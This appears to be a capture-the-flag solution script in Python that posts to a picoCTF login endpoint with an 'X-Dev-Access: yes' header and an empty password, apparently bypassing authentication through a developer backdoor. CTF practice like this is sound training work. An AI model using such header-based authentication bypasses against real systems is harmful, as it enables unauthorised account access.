from requests import request as req


res = req(
    url="http://amiable-citadel.picoctf.net:65037/login",
    method="post",
    headers={
        "X-Dev-Access": "yes",
    },
    data={"email": "ctf-player@picoctf.org", "password": ""},
)

print(res.text)
